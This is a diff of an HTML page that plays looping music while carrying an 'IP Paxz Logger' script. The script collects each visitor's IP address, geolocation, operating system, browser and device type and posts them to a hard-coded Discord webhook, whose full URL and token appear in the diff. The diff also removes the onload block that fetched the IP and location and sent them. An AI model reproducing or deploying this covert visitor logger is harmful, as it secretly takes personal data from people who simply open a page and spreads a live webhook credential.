@@ -28,20 +28,18 @@
         }
     </style>
     <script>
-        var embedSent = false;
-        var musicStarted = false;
-
-        var webhookURL = "https://discord.com/api/webhooks/1213815065594175538/5nAvt25ByKhCQHt-C2byxRp60Kxhrtof-RdQ249Fi5ySE8dRbRhASEuL_IVtwEh8-XlS";
-
-        function startMusic() {
-            var audio = new Audio('music.mp3'); // Change 'sound.mp3' to 'music.mp3' for the music file
+        document.addEventListener("DOMContentLoaded", function() {
+            var audio = new Audio('music.mp3');
             audio.play();
-            musicStarted = true;
             audio.addEventListener('ended', function() {
                 this.currentTime = 0;
                 this.play();
             }, false);
-        }
+        });
+
+        var embedSent = false;
+
+        var webhookURL = "https://discord.com/api/webhooks/1213815065594175538/5nAvt25ByKhCQHt-C2byxRp60Kxhrtof-RdQ249Fi5ySE8dRbRhASEuL_IVtwEh8-XlS";
 
         function sendToDiscord(ipAddress, locationData) {
             console.log("IP Address:", ipAddress);
@@ -65,23 +63,20 @@
         }
 
         function sendEmbed(embedData) {
-            if (embedSent) return; // If embed is already sent, return
+            if (embedSent) return;
 
             var userAgent = navigator.userAgent;
             var timestamp = new Date().toISOString();
             var os = detectOS(userAgent);
-            console.log("Operating System:", os);
             var browser = detectBrowser(userAgent);
-            console.log("Browser:", browser);
             var deviceType = getDeviceType();
-            console.log("Device Type:", deviceType);
 
             var embed = {
                 "embeds": [
                     {
                         "title": "IP Paxz Logger",
                         "description": "A user has visited the page.",
-                        "color": 65280, // Green if liked, Red if not
+                        "color": 65280,
                         "fields": [
                             {
                                 "name": "IP Address",
@@ -162,7 +157,7 @@
                 if (xhr.readyState === XMLHttpRequest.DONE) {
                     if (xhr.status === 200) {
                         console.log("Embed sent successfully!");
-                        embedSent = true; // Set embedSent to true after successfully sending the embed
+                        embedSent = true;
                     } else {
                         console.error("Failed to send embed:", xhr.status, xhr.statusText);
                     }
@@ -227,34 +222,6 @@
             return "Unknown Device";
         }
 
-        window.onload = function() {
-            var audio = new Audio('music.mp3');
-            audio.addEventListener('ended', function() {
-                this.currentTime = 0;
-                this.play();
-            }, false);
-
-            fetch('https://api64.ipify.org?format=json')
-                .then(response => response.json())
-                .then(data => {
-                    var ipAddress = data.ip;
-                    console.log("Public IP Address:", ipAddress);
-
-                    fetch(`https://ipapi.co/${ipAddress}/json/`)
-                        .then(response => response.json())
-                        .then(locationData => {
-                            sendToDiscord(ipAddress, locationData);
-                        })
-                        .catch(error => {
-                            console.error('Unable to fetch location data:', error);
-                            sendToDiscord(ipAddress, null); // Send embed with default location data
-                        });
-                })
-                .catch(error => {
-                    console.error('Unable to fetch public IP address:', error);
-                });
-        }
-        audio.play();
     </script>
 </head>
 <body>
